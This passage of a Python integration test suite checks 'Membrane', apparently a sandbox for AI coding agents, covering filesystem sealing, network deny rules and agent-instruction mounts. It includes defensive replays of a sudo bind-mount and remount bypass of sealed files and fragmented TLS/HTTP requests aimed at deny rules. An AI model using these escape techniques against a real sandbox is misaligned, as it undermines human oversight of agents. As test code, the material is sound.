        (base / path).write_text(data)
    (base / "symlink").symlink_to("protected")
    os.link(base / "protected", base / "hardlink")
    shutil.copy2(base / "trace-workload", base / "protected-exec")
    config(ctx, ("sealed" if sealed else "readonly") + ":\n  - protected\n  - protected-exec\n  - secrets/\n")
    copy_policy_workload(base)
    # Linux xattr APIs are absent from macOS Python. Prepare metadata using
    # Linux's view of the same workspace, outside any Membrane policy session.
    prepared = run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(base.resolve()) + ":" + str(base.resolve()),
                         "-w", str(base.resolve()), "--entrypoint=python3", "membrane-agent",
                         "policy-workload.py", "prepare"])
    ctx.output.extend(line for line in prepared.stdout.splitlines() if line.startswith(("PASS ", "SKIP ")))
    with Session(ctx, base, ["sudo", "python3", "policy-workload.py",
                            "sealed" if sealed else "readonly"], options=["--no-trace"]) as session:
        session.wait_for("ready")
        check(ctx, (base / "protected").read_text() == "protected data\n", "host can read protected object")
        (base / "protected").write_text("host modified protected object\n")
        (base / "secrets/api-key.txt").write_text("host modified child\n")
        (base / "host-new").write_text("host\n")
        check(ctx, (base / "protected").read_text().startswith("host modified"), "host can modify enrolled objects")
        session.release()
        output = session.wait()
        ctx.output.extend(line for line in output.splitlines() if line.startswith("PASS "))
        cleaned(ctx, session)


def group_28(ctx):
    build_trace_workload(ctx)
    with trace_session(ctx, "trace-disabled", 45103, traced=False) as n:
        n.wait_for("trace-disabled.first")
        check_handler(ctx, n, traced=False)
        n.release()
        n.wait()
        check(ctx, not (n.directory / "trace.jsonl.gz").exists(), "--no-trace produces no trace file")
        cleaned(ctx, n)

    env = trace_docker_env(ctx)
    with trace_session(ctx, "trace-failed", 45105, env=dict(env, FAIL_BPF="1", BPF_FAILURE_ARTIFACTS=str(ctx.workdir / "trace-failed"))) as failed:
        failed_output = failed.wait(expected=None, timeout=60)
        check(ctx, failed.process.returncode != 0 and "load eBPF objects" in failed_output,
              "BPF load failure aborts setup clearly")
        check(ctx, not (failed.directory / "trace-failed.first").exists(), "failed loading never starts workload")
        check(ctx, not (failed.directory / "agent-created").exists()
              and "Handler ready." not in (failed.directory / "failed-handler.log").read_text(),
              "failed tracing neither signals ready nor creates agent")
        cleaned(ctx, failed)


def group_29(ctx):
    directory = (ctx.workdir / "workspace with spaces").resolve()
    directory.mkdir()
    link = ctx.workdir / "launch link"
    link.symlink_to(directory, target_is_directory=True)
    (ctx.workdir / "parent-only").write_text("outside workspace\n")
    sibling = ctx.workdir / "sibling"
    sibling.mkdir()
    (sibling / "host-only").write_text("outside workspace\n")
    command = ["bash", "-c", r'''set -eu
test "$PWD" = "$1"
test "$HOME" = /home/agent
test ! -e /workspace
test ! -L /workspace
test ! -e ../parent-only
test ! -e ../sibling
test ! -e '../launch link'
printf '%s\n' "$PWD" > 'written by agent'
touch ready
while [ ! -e continue ]; do sleep 0.1; done
''', "workspace-check", str(directory)]
    for launch in (directory, link):
        # Preserve the logical launch path so Run's existing EvalSymlinks is exercised.
        terminal = launch == link
        with Session(ctx, launch, [] if terminal else command, options=["--no-trace"], terminal=terminal,
                     env=dict(ctx.environment, PWD=str(launch))) as session:
            if terminal:
                os.write(session.terminal[0], (shlex.join(command) + "\nexit\n").encode())
            session.wait_for("ready")
            agent = inspect(ctx, "membrane-agent-" + session.id)
            mounts = {m["Destination"]: m for m in agent["Mounts"]}
            check(ctx, agent["Config"]["WorkingDir"] == str(directory)
                  and str(directory) in mounts and mounts[str(directory)]["Source"] == str(directory)
                  and mounts[str(directory)]["RW"], launch.name + ": canonical writable mount and working directory")
            check(ctx, "/workspace" not in mounts
                  and not any(m["Source"] in {str(p) for p in directory.parents} for m in agent["Mounts"]),
                  launch.name + ": no workspace alias or host parent mount")
            check(ctx, (directory / "written by agent").read_text() == str(directory) + "\n",
                  launch.name + ": command writes to host workspace with spaces; parents and siblings stay isolated")
            session.release()
            session.wait()
            cleaned(ctx, session)
        for name in ("ready", "continue", "written by agent"):
            (directory / name).unlink()

    build_trace_workload(ctx)
    run(ctx, [ctx.membrane_cmd, "--no-update", "--no-global-config",
              "--trace-log=" + str(ctx.workdir / "exit37.gz"), "--", "bash", "-c", "exit 37"],
        timeout=60, expected=37)
    check(ctx, True, "workload exit 37 preserved")

    with trace_session(ctx, "trace-terminal", 45104, terminal=True) as terminal:
        terminal.wait_for("trace-terminal.first")
        master, slave = terminal.terminal
        os.write(master, b"membrane-terminal-input\n")
        deadline = time.monotonic() + 10
        while "TTY INPUT membrane-terminal-input" not in terminal.output() and time.monotonic() < deadline:
            time.sleep(0.1)
        check(ctx, "TTY INPUT membrane-terminal-input" in terminal.output(), "terminal input reaches workload")
        os.write(master, b"\x03")
        terminal.wait(expected=130)
        check(ctx, termios.tcgetattr(slave) == terminal.terminal_state, "terminal settings restored after Ctrl-C")
        trace_events(ctx, terminal.directory / "trace.jsonl.gz")
        cleaned(ctx, terminal)


def update_snapshot_workspace(ctx, session, changes):
    # Send Python over stdin so SSH cannot reinterpret paths or multiline code.
    # Colima's login user owns the shared workspace; native Linux uses the same
    # user as this runner. No container exec or session cgroup is involved.
    command = (["colima", "ssh", "--profile", "membrane", "--", "python3", "-"]
               if sys.platform == "darwin" else [sys.executable, "-"])
    script = f"""import os
from pathlib import Path
directory = Path({str(session.directory)!r})
session_id = {session.id!r}
cgroup = next(line.split(':', 2)[2] for line in Path('/proc/self/cgroup').read_text().splitlines()
              if line.startswith('0::'))
parents = {{'membrane-' + session_id, 'membrane' + session_id + '.slice'}}
if parents.intersection(Path(cgroup).parts):
    raise RuntimeError('host mutator is inside session cgroup: ' + cgroup)
print('PASS trusted Docker-host mutator outside session cgroup: ' + cgroup, flush=True)
"""
    result = run(ctx, command, input=script + changes + '\n(directory / "continue").touch()\n')
    ctx.output.extend(line for line in result.stdout.splitlines() if line.startswith("PASS "))


def group_30(ctx):
    build_trace_workload(ctx)
    info = json.loads(run(ctx, ["docker", "info", "--format", "{{json .}}"], ).stdout)
    arch = {"aarch64": "arm64", "x86_64": "amd64"}.get(info["Architecture"], info["Architecture"])
    run(ctx, ["go", "build", "-buildvcs=false", "-o", str(ctx.workdir / "policy-dind"),
              str(REPO_ROOT / "scripts/testdata/policy-dind.go")],
        env=dict(ctx.environment, CGO_ENABLED="0", GOOS="linux", GOARCH=arch))
    for name in ("a", "b", "failed", "snapshot", "late"):
        directory = ctx.workdir / name
        directory.mkdir()
        copy_policy_workload(directory)
    a_dir, b_dir = ctx.workdir / "a", ctx.workdir / "b"
    (a_dir / "protected").write_text("sealed\n")
    readonly_dir = ctx.workdir / "additional readonly"
    readonly_dir.mkdir()
    (readonly_dir / "readonly").write_text("readonly\n")
    os.link(readonly_dir / "readonly", a_dir / "readonly")
    os.link(a_dir / "protected", readonly_dir / "sealed-alias")
    (a_dir / ".membrane.yaml").write_text("sealed: [protected]\nmounts: [{path: '../additional readonly', mode: ro}]\n")
    (b_dir / "other").write_text("B sealed\n")
    os.link(a_dir / "protected", b_dir / "protected")
    os.link(b_dir / "other", a_dir / "other")
    (b_dir / ".membrane.yaml").write_text("sealed: [other]\n")
    shutil.copy2(ctx.workdir / "policy-dind", a_dir / "policy-dind")
    with ExitStack() as stack:
        a = stack.enter_context(Session(ctx, a_dir, ["sudo", "python3", "policy-workload.py", "hold"], options=["--no-trace"]))
        a.wait_for("ready")
        b = stack.enter_context(Session(ctx, b_dir, ["sudo", "python3", "policy-workload.py", "ordinary"], options=["--trace-log=" + str(b_dir / "trace.jsonl.gz")]))
        b.wait_for("ready")
        check_handler(ctx, a, traced=False, policy=True)
        check_handler(ctx, b, traced=True, policy=True)
        agent_a, agent_b = inspect(ctx, "membrane-agent-" + a.id), inspect(ctx, "membrane-agent-" + b.id)
        check(ctx, a.id != b.id and agent_a["HostConfig"]["CgroupParent"] != agent_b["HostConfig"]["CgroupParent"], "concurrent policy sessions have distinct cgroups")
        run(ctx, ["docker", "exec", "membrane-handler-" + a.id, "test", "!", "-d", "/trace"])
        check(ctx, (a_dir / "protected").read_text() == "other session write\n", "other session can mutate the same inode")
        run(ctx, ["docker", "exec", "-u", "root", "membrane-agent-" + a.id, "cat", str(a_dir.resolve() / "other")])
        run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(a_dir) + ":/data", "--entrypoint=python3", "membrane-agent", "-c",
                  "from pathlib import Path; p=Path('/data/protected'); p.read_bytes(); p.write_text('unrelated write\\n')"])
        check(ctx, True, "unrelated Docker container remains unrestricted")
        # Explicit original exploit, executing as sandbox root through sudo.
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "mkdir", "-p", "/tmp/workspace-copy"])
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "mount", "--bind", str(a_dir.resolve()), "/tmp/workspace-copy"])
        # Use the alias without spaces for remount (mount's target lookup can
        # fail on escaped paths), with explicit source and target arguments.
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "mount", "-o", "remount,rw,bind",
                  str(a_dir.resolve()), "/tmp/workspace-copy"])
        probe = """import errno, os
for name, readable in [('protected', False), ('readonly', True)]:
 for flags, allowed in [(os.O_RDONLY, readable), (os.O_WRONLY, False)]:
  try: fd = os.open('/tmp/workspace-copy/' + name, flags)
  except OSError as e:
   if allowed or e.errno != errno.EACCES: raise
  else:
   os.close(fd)
   if not allowed: raise RuntimeError('mount alias bypass: ' + name)
"""
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", "python3", "-c", probe])
        check(ctx, True, "F-005 sudo bind-mount alias and rw remount preserve selectors and additional readonly mount policy")
        run(ctx, ["docker", "exec", "membrane-agent-" + a.id, "sudo", str(a_dir.resolve() / "policy-dind")], timeout=90)
        check(ctx, True, "inner Docker descendant remains subject to policy")
        b.release(); b.wait(); trace_events(ctx, b_dir / "trace.jsonl.gz"); cleaned(ctx, b)
        a.release(); a.wait(); cleaned(ctx, a)

    env = trace_docker_env(ctx)
    failed_dir = ctx.workdir / "failed"
    (failed_dir / "protected").write_text("secret\n")
    (failed_dir / ".membrane.yaml").write_text("sealed: [protected]\n")
    with Session(ctx, failed_dir, ["touch", "first-instruction"], options=["--no-trace"], env=dict(env, FAIL_BPF="1", BPF_FAILURE_ARTIFACTS=str(failed_dir))) as failed:
        output = failed.wait(expected=None)
        check(ctx, failed.process.returncode != 0 and "load filesystem policy BPF" in output, "LSM setup failure aborts clearly")
        check(ctx, not (failed_dir / "first-instruction").exists(), "failed policy never starts workload")
        check(ctx, not (failed_dir / "agent-created").exists()
              and "Handler ready." not in (failed_dir / "failed-handler.log").read_text(),
              "failed policy neither signals ready nor creates agent")
        cleaned(ctx, failed)

    directory = ctx.workdir / "snapshot"
    for name in ("late", "moved", "tree"):
        (directory / name).mkdir()
    (directory / ".env").write_text("startup sealed\n")
    os.link(directory / ".env", directory / "old-alias")
    (directory / "ordinary").write_text("ordinary\n")
    (directory / "readonly-old").write_text("readonly original\n")
    (directory / ".membrane.yaml").write_text("sealed: [.env, tree/]\nreadonly: [readonly-old]\n")
    with Session(ctx, directory, ["sudo", "python3", "policy-workload.py", "snapshot"], options=["--no-trace"]) as snapshot:
        snapshot.wait_for("ready")
        update_snapshot_workspace(ctx, snapshot, r'''
(directory / ".env").rename(directory / "renamed-env")
(directory / ".env").write_text("replacement\n")
(directory / "late/.env").write_text("late\n")
(directory / "ordinary").rename(directory / "moved/.env")
(directory / "temp").write_text("replacement\n")
os.replace(directory / "temp", directory / "readonly-old")
(directory / "tree/new").write_text("new\n")
''')
        output = snapshot.wait()
        ctx.output.extend(line for line in output.splitlines() if line.startswith("PASS "))
        cleaned(ctx, snapshot)

    directory = ctx.workdir / "late"
    (directory / ".membrane.yaml").write_text("sealed: [.env]\n")
    with Session(ctx, directory, ["sudo", "python3", "policy-workload.py", "late-only"], options=["--no-trace"]) as late:
        late.wait_for("ready")
        check_handler(ctx, late, traced=False)
        check(ctx, bool(inspect(ctx, "membrane-agent-" + late.id)["HostConfig"]["CgroupParent"]), "empty snapshot still has a supervised workload cgroup")
        processes = run(ctx, ["docker", "top", "membrane-handler-" + late.id, "-eo", "pid,comm"]).stdout.splitlines()[1:]
        commands = {line.split(maxsplit=1)[1].strip() for line in processes}
        check(ctx, "tracer" not in commands, "empty snapshot does not instantiate filesystem BPF")
        update_snapshot_workspace(ctx, late, r'(directory / ".env").write_text("late\n")')
        output = late.wait()
        ctx.output.extend(line for line in output.splitlines() if line.startswith("PASS "))
        cleaned(ctx, late)


def workload_cgroup(ctx, session):
    parent = inspect(ctx, "membrane-agent-" + session.id)["HostConfig"]["CgroupParent"]
    return "/sys/fs/cgroup/" + parent.lstrip("/")


def host_root():
    if sys.platform == "darwin":
        return ["colima", "ssh", "--profile", "membrane", "--", "sudo", "-n"]
    return ["sudo", "-n"] if os.geteuid() != 0 else []


def lifecycle_session(ctx, token, *, policy=False, env=None):
    directory = ctx.workdir / token
    directory.mkdir()
    (directory / "protected").write_text("secret\n")
    (directory / ".membrane.yaml").write_text("sealed: [protected]\n" if policy else "{}\n")
    # Record workload liveness without relying on Docker's daemon state.
    command = ["python3", "-c", """import os, time
from pathlib import Path
Path('ready').write_text('ready')
while not Path('continue').exists():
    Path('alive').write_text(str(time.monotonic_ns()))
    time.sleep(0.02)
Path('completed').touch()
"""]
    return Session(ctx, directory, command, options=["--no-trace"], env=env)


def group_31(ctx):
    # Keep B running while A fails. Pause only A's CLI so that handler-side
    # fail-stop is proven independently of host-side cleanup.
    with lifecycle_session(ctx, "survivor", policy=True) as survivor:
        survivor.wait_for("ready")
        survivor_cgroup = workload_cgroup(ctx, survivor)
        for component in ("tracer", "dns-proxy", "mitmproxy"):
            with lifecycle_session(ctx, component, policy=(component == "tracer")) as session:
                session.wait_for("ready")
                handler = "membrane-handler-" + session.id
                check_handler(ctx, session, traced=False, policy=(component == "tracer"))
                cgroup = workload_cgroup(ctx, session)
                # The regular cgroup namespace is read-only; the only writable
                # cgroup mount is the separate, scoped workload control mount.
                run(ctx, ["docker", "exec", handler, "python3", "-c", """from pathlib import Path
import os, sys
mounts = [line.split() for line in Path('/proc/mounts').read_text().splitlines()]
assert [(m[1]) for m in mounts if m[2] == 'cgroup2' and 'rw' in m[3].split(',')] == ['/workload-cgroup']
for path in (sys.argv[1], '/workload-cgroup/../' + Path(sys.argv[1]).name):
    assert not Path(path).exists(), path
assert os.access('/workload-cgroup/cgroup.kill', os.W_OK)
assert Path('/workload-cgroup/cgroup.events').read_text().splitlines().count('populated 1') == 1
""", survivor_cgroup])
                check(ctx, True, component + ": handler cannot access concurrent session cgroup")
                run(ctx, [*host_root(), "test", "!", "-e", "/sys/fs/bpf/membrane/" + session.id])
                check(ctx, True, component + ": active policy needs no pin directory")
                os.kill(session.process.pid, signal.SIGSTOP)
                try:
                    # Process namespace PIDs, read from the actual direct children.
                    run(ctx, ["docker", "exec", handler, "python3", "-c", r"""from pathlib import Path
import os, signal, sys
wanted = 'mitmdump' if sys.argv[1] == 'mitmproxy' else sys.argv[1]
pids = []
for pid in Path('/proc/1/task/1/children').read_text().split():
    args = Path('/proc/' + pid + '/cmdline').read_bytes().split(b'\0')
    if any(Path(arg.decode()).name == wanted for arg in args if arg):
        pids.append(int(pid))
assert len(pids) == 1, pids
os.kill(pids[0], signal.SIGKILL)
""", component], expected=None)
                    status = run(ctx, ["docker", "wait", handler], timeout=15).stdout.strip()
                    check(ctx, status.isdigit() and int(status) != 0, component + ": handler exits nonzero without CLI help")
                    events = run(ctx, [*host_root(), "cat", cgroup + "/cgroup.events"]).stdout
                    check(ctx, "populated 0" in events.splitlines(), component + ": workload subtree drained before handler exit")
                    before = (session.directory / "alive").read_text()
                    time.sleep(0.1)
                    check(ctx, (session.directory / "alive").read_text() == before
                          and not (session.directory / "completed").exists(), component + ": workload killed")
                    events_b = run(ctx, [*host_root(), "cat", survivor_cgroup + "/cgroup.events"]).stdout
                    check(ctx, "populated 1" in events_b.splitlines(), component + ": session B stays populated")
                    before_b = (survivor.directory / "alive").read_text()
                    time.sleep(0.1)
                    check(ctx, (survivor.directory / "alive").read_text() != before_b, component + ": session B remains running")
                    denied = run(ctx, ["docker", "exec", "membrane-agent-" + survivor.id, "cat", str(survivor.directory.resolve() / "protected")], expected=None)
                    check(ctx, denied.returncode != 0 and "Permission denied" in denied.stderr,
                          component + ": session B filesystem enforcement remains attached")
                finally:
                    os.kill(session.process.pid, signal.SIGCONT)
                session.wait(expected=None)
                check(ctx, session.process.returncode != 0, component + ": host reports session failure")
                cleaned(ctx, session)
        survivor.release()
        survivor.wait()
        cleaned(ctx, survivor)

    with lifecycle_session(ctx, "handler-killed", policy=True) as session:
        session.wait_for("ready")
        run(ctx, ["docker", "kill", "--signal=KILL", "membrane-handler-" + session.id])
        session.wait(expected=None, timeout=45)
        check(ctx, session.process.returncode != 0 and not (session.directory / "completed").exists(),
              "host notices handler death and kills workload")
        cleaned(ctx, session)

    for sig in (signal.SIGINT, signal.SIGTERM, signal.SIGHUP):
        with lifecycle_session(ctx, "cli-" + sig.name, policy=True) as session:
            session.wait_for("ready")
            session.process.send_signal(sig)
            session.wait(expected=None, timeout=45)
            check(ctx, not (session.directory / "completed").exists(), sig.name + ": workload terminated")
            cleaned(ctx, session)
            path = Path.home() / ".membrane/logs" / ("membrane-handler-" + session.id + ".log.gz")
            with gzip.open(path, "rt") as log:
                text = log.read()
            check(ctx, "tracer exited cleanly" in text and "exited unexpectedly" not in text,
                  sig.name + ": orderly loader shutdown")


def group_32(ctx):
    denied = """  - dest: https://httpbin.org
    http:
      - methods: [DELETE, PATCH]
        paths: [/v1/items, /anything/other]
"""
    config(ctx, 'allow: [httpbin.org]\ndeny:\n' + denied)
    for flag, version in (('--http1.1', '1.1'), ('--http2', '2')):
        result = membrane(ctx, ['curl', '-sS', '-m', '5', flag, '-o', '/dev/null',
                               '-w', '%{http_version} %{http_code}', '-X', 'DELETE',
                               'https://httpbin.org/v1/items'])
        check(ctx, result.stdout.strip() == version + ' 403',
              f'32 HTTP/{version} deny under bare-host allow (got {result.stdout.strip()!r})')
    for method, path, expected in (
        ('DELETE', '/v1/items?anything=1', '403'),
        ('DELETE', '/v1/items/child?x=/../../public', '403'),
        ('DELETE', '/v1/items/', '403'),
        ('PATCH', '/anything/other', '403'),
        ('GET', '/v1/items?anything=1', '404'),
        ('DELETE', '/v1/items-extra', '404'),
        ('GET', '/anything/other', '200'),
    ):
        http(ctx, f'32 HTTP deny {method} {path}', expected,
             'https://httpbin.org' + path, method=method, curl_options=['--path-as-is'])
    for rules in ('  - unrelated.example\n' + denied, denied + '  - unrelated.example\n'):
        config(ctx, 'allow: [httpbin.org]\ndeny:\n' + rules)
        http(ctx, '32 deny order and CLI allow cannot bypass veto', '403',
             'https://httpbin.org/v1/items?anything=1', method='DELETE',
             options=['--allow=https://httpbin.org/v1/items'])

    config(ctx, """allow: [httpbin.org]
deny:
  - dest: httpbin.org
    ports: [8443]
    http:
      - methods: [GET]
""")
    http(ctx, '32 HTTP deny on a different port leaves HTTPS usable', '200',
         'https://httpbin.org/anything/other')
    config(ctx, """allow: [https://httpbin.org/anything/other]
deny:
  - dest: '*'
    http:
      - methods: [GET]
""")
    http(ctx, '32 broad deny vetoes narrow allow', '403',
         'https://httpbin.org/anything/other')

    # Queries do not change allow matching either, and still reach the server.
    config(ctx, 'allow: [https://httpbin.org/anything/items]\ndeny: []\n')
    result = membrane(ctx, ['curl', '-fsS', '--path-as-is',
                           'https://httpbin.org/anything/items?x=/../../public'])
    body = json.loads(result.stdout)
    check(ctx, body['args']['x'] == '/../../public' and '/anything/items?' in body['url'],
          '32 pathname-only matching preserves the forwarded query')


def group_33(ctx):
    config(ctx, 'allow: [github.com]\ndeny: [{dest: github.com, http: [{methods: [DELETE]}]}]\n')
    exit_status(ctx, '33 HTTP deny preserves allowed raw SSH', 0,
                ['bash', '-c', 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])

    config(ctx, """allow: [github.com]
deny:
  - dest: github.com
    ports: [22]
""")
    exit_status(ctx, '33 hostname TCP deny blocks SSH with broad allow', 0,
                ['bash', '-c', '! { sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH; }'])
    http(ctx, '33 hostname TCP deny leaves port 443 usable', '200', 'https://github.com/')

    config(ctx, 'allow: [{dest: 8.8.8.8, ports: [53/udp]}]\ndeny: []\n')
    exit_status(ctx, '33 UDP opt-in works without denies', 0, ['dig', '@8.8.8.8', 'github.com'])
    config(ctx, """allow:
  - dest: 8.8.8.8
    ports: [53/udp]
deny:
  - dest: 8.8.8.0/24
    ports: [53/udp]
""")
    exit_status(ctx, '33 CIDR UDP deny vetoes UDP opt-in', 0,
                ['bash', '-c', 'dig @8.8.8.8 github.com; test "$?" -eq 9'])

    config(ctx, """allow: ['*']
deny:
  - dest: '*.github.com'
    ports: [443]
""")
    exit_status(ctx, '33 wildcard transport deny beats any-host allow', 0,
                ['bash', '-c', 'curl -sf -m 5 https://api.github.com/; test "$?" -eq 28'])
    http(ctx, '33 wildcard transport deny leaves apex usable', '200', 'https://github.com/')

    config(ctx, """deny: [httpbin.org]
""")
    dns(ctx, '33 deny-only hostname does not authorize DNS', 'NXDOMAIN', ['dig', 'httpbin.org'])
    config(ctx, """allow: [https://httpbin.org/anything/root]
deny: ['*']
""")
    exit_status(ctx, '33 broad transport deny vetoes narrow URL allow', 0,
                ['bash', '-c', 'curl -sf -m 5 https://httpbin.org/anything/root; test "$?" -eq 28'])


def group_34(ctx):
    policy_home = ctx.workdir / 'policy-home'
    (policy_home / '.membrane').mkdir(parents=True)
    (policy_home / '.membrane/src').symlink_to(REPO_ROOT, target_is_directory=True)
    global_file = policy_home / '.membrane/config.yaml'
    env = dict(ctx.environment, HOME=str(policy_home))
    # Isolate Membrane's global policy while retaining access to the existing
    # Docker context and Colima VM, whose defaults also depend on HOME.
    env.setdefault('DOCKER_CONFIG', str(Path.home() / '.docker'))
    if sys.platform == 'darwin' and not env.get('COLIMA_HOME'):
        colima_home = Path.home() / '.colima'
        if not colima_home.is_dir():
            colima_home = Path(env.get('XDG_CONFIG_HOME') or Path.home() / '.config') / 'colima'
        env['COLIMA_HOME'] = str(colima_home)
    global_file.write_text("""allow: [httpbin.org]
deny:
  - dest: httpbin.org
    http: [{methods: [DELETE], paths: [/anything/global]}]
""")
    config(ctx, """allow: [httpbin.org]
deny:
  - dest: httpbin.org
    http: [{methods: [DELETE], paths: [/anything/workspace]}]
""")
    for path, skip, expected in (('global', False, '403'), ('workspace', False, '403'),
                                 ('global', True, '200'), ('workspace', True, '403')):
        result = membrane(ctx, ['curl', '-sS', '-o', '/dev/null', '-w', '%{http_code}',
                                '-X', 'DELETE', 'https://httpbin.org/anything/' + path], env=env,
                          options=['--no-global-config=' + str(skip).lower(), '--allow=httpbin.org'])
        check(ctx, result.stdout.strip() == expected,
              f'34 {path} deny with no-global-config={skip}, workspace/global/CLI allows')

    for rule in ('{dest: httpbin.org, ports: [53/udp], http: [{methods: [GET]}]}',
                 '{dest: https://httpbin.org/v1, ports: [443, 443/udp], http: []}'):
        config(ctx, 'allow: [httpbin.org]\ndeny: [' + rule + ']\n')
        result = membrane(ctx, ['echo', 'workload-started'], expected=None)
        check(ctx, result.returncode != 0 and 'UDP ports cannot be combined' in result.stderr
              and 'workload-started' not in result.stdout,
              '34 unsupported UDP HTTP/path deny fails before workload starts')


def group_35(ctx):
    config(ctx, """allow: [httpbin.org]
deny:
  - dest: httpbin.org
    http: [{methods: [DELETE], paths: [/anything/private]}]
""")
    # Real sockets through the handler: split both the TLS ClientHello and the
    # HTTP method, without disabling certificate verification.
    result = membrane(ctx, ['python3', '-c', r'''
import socket, ssl, time
for secure, method, expected in ((False, 'DELETE', b'403'), (True, 'DELETE', b'403'),
                                  (True, 'GET', b'200')):
    with socket.create_connection(('httpbin.org', 443 if secure else 80), timeout=10) as sock:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if secure:
            incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
            tls = ssl.create_default_context().wrap_bio(incoming, outgoing, server_hostname='httpbin.org')
            first = True
            def flush():
                global first
                data = outgoing.read()
                if first and data:
                    sock.sendall(data[:1])
                    time.sleep(0.2)
                    data, first = data[1:], False
                if data:
                    sock.sendall(data)
            while True:
                try:
                    tls.do_handshake()
                    flush()
                    break
                except ssl.SSLWantReadError:
                    flush()
                    incoming.write(sock.recv(65536))
            def send(data):
                tls.write(data)
                flush()
            def recv():
                while True:
                    try:
                        return tls.read(65536)
                    except ssl.SSLWantReadError:
                        flush()
                        data = sock.recv(65536)
                        if not data:
                            return b''
                        incoming.write(data)
        else:
            send, recv = sock.sendall, lambda: sock.recv(65536)
        request = (method + ' /anything/private?x=/../../public HTTP/1.1\r\n'
                   'Host: httpbin.org\r\nConnection: close\r\n\r\n').encode()
        send(request[:1])
        time.sleep(0.2)
        send(request[1:])
        response = b''
        while b'\r\n' not in response:
            chunk = recv()
            assert chunk, response
            response += chunk
        assert response.split(b' ')[1] == expected, response
        print('PASS', 'TLS' if secure else 'HTTP', method)
'''])
    check(ctx, result.stdout.count('PASS') == 3, '35 fragmented HTTP/TLS denies and allowed GET')


def group_36(ctx):
    # Isolate user-managed files and shared client home from the real user.
    home = ctx.workdir / "host-home"
    state = home / ".membrane"
    state.mkdir(parents=True)
    (state / "src").symlink_to(REPO_ROOT, target_is_directory=True)
    env = dict(ctx.environment, HOME=str(home))
    env.setdefault("DOCKER_CONFIG", str(Path.home() / ".docker"))
    if sys.platform == 'darwin' and not env.get('COLIMA_HOME'):
        colima_home = Path.home() / '.colima'
        if not colima_home.is_dir():
            colima_home = Path(env.get('XDG_CONFIG_HOME') or Path.home() / '.config') / 'colima'
        env['COLIMA_HOME'] = str(colima_home)
    membrane(ctx, ["true"], env=env)
    check(ctx, all((state / name).read_bytes() == (REPO_ROOT / name).read_bytes()
                   and not (state / name).is_symlink() for name in ("config.yaml", "AGENTS.md")),
          "both missing user files initialized as independent copies")
    global_yaml = "# User policy\nallow: [192.0.2.0/24]\ndeny: [192.0.2.128/25]\nargs: [-e, VISIBLE_LITERAL=fixture]\n"
    (state / "config.yaml").write_text(global_yaml)
    config(ctx, "allow: [198.51.100.0/24]\nreadonly: [.membrane.yaml]\n")
    project = {name: "project " + name + "\n" for name in ("AGENTS.md", "CLAUDE.md", "CLAUDE.local.md")}
    for name, content in project.items():
        (ctx.workdir / name).write_text(content)
    codex = state / "home/.codex"
    base = "Existing Codex instructions.\n"
    (codex / "AGENTS.md").write_text(base)
    shipped = (REPO_ROOT / "AGENTS.md").read_text()
    for number, (override, skip) in enumerate(((None, False), ("User override.\n", False), (" \n", True))):
        if number == 1:
            for name in ("config.yaml", "AGENTS.md"):
                (state / name).rename(state / (name + ".user"))
                (state / name).symlink_to(name + ".user")
        guidance = shipped + f"\nUser guidance revision {number}\n"
        (state / "AGENTS.md").write_text(guidance)
        if override is not None:
            (codex / "AGENTS.override.md").write_text(override)
        active = "AGENTS.override.md" if override and override.strip() else "AGENTS.md"
        original = override if active == "AGENTS.override.md" else base
        result = membrane(ctx, ["python3", "-c", r"""import errno, json, sys
from pathlib import Path
active, original, guidance, global_yaml, skip, project = sys.argv[1:]
canonical = Path('/etc/membrane/AGENTS.md')
claude = Path('/etc/claude-code/CLAUDE.md')
codex = Path('/home/agent/.codex') / active
assert canonical.read_text() == guidance
assert claude.read_text() == guidance
assert codex.read_text() == original + '\n\n' + guidance
files = [canonical, claude, codex]
global_file = Path('/etc/membrane/config.yaml')
if skip == 'true':
    assert not global_file.exists()
else:
    assert global_file.read_text() == global_yaml
    files.append(global_file)
for name in ('effective-policy.json', 'effective-policy.yaml', 'global-policy.yaml'):
    assert not (Path('/etc/membrane') / name).exists()
for filename, content in json.loads(project).items():
    assert Path(filename).read_text() == content
assert Path('.membrane.yaml').is_file()
for file in files:
    try:
        with file.open('a'):
            pass
    except OSError as error:
        assert error.errno == errno.EROFS, (file, error)
    else:
        raise AssertionError(str(file) + ' is writable')
print('editable-instructions-ok')
""", active, original, guidance, global_yaml, str(skip).lower(), json.dumps(project)], env=env,
            options=["--no-global-config=" + str(skip).lower(), "--allow=203.0.113.0/24"])
        check(ctx, "editable-instructions-ok" in result.stdout,
              f"revision {number}: latest guidance, readonly files, Codex {active}, skip global={skip}")
        check(ctx, (codex / "AGENTS.md").read_text() == base and
              (override is None or (codex / "AGENTS.override.md").read_text() == override),
              "shared Codex originals unchanged")
        check(ctx, all((ctx.workdir / name).read_text() == content for name, content in project.items()),
              "project instructions unchanged")
        check(ctx, (state / "config.yaml").read_text() == global_yaml and
              (state / "AGENTS.md").read_text() == guidance and
              (number == 0 or all(os.readlink(state / name) == name + ".user" for name in ("config.yaml", "AGENTS.md"))),
              "user edits and symlinks preserved on subsequent starts")
        check(ctx, not list((state / "tmp").glob("membrane-instructions-*")), "session copy cleaned up")


def group_37(ctx):
    base = ctx.workdir.resolve()
    workspace = base / 'primary workspace'
    shared = base / 'shared library'
    readonly = base / 'readonly directory'
    empty = base / 'empty readonly'
    global_dir = base / 'global library'
    unselected = base / 'unselected'
    for directory in (workspace, shared, readonly, empty, global_dir, unselected):
        directory.mkdir()
    (base / 'parent-only').write_text('outside\n')
    (unselected / 'file').write_text('outside\n')
    (base / 'shared link').symlink_to(shared, target_is_directory=True)
    (shared / 'outside').symlink_to(unselected, target_is_directory=True)
    for root in (workspace, shared, global_dir):
        for name in ('.env', 'nested/.env', 'secrets/credentials.json', 'nested/secrets/credentials.json',
                     'nested/mysecrets/credentials.json', 'unrelated', 'workspace-readonly',
                     'global-only', 'global-readonly', 'global-anchor'):
            path = root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text('fixture data\n')
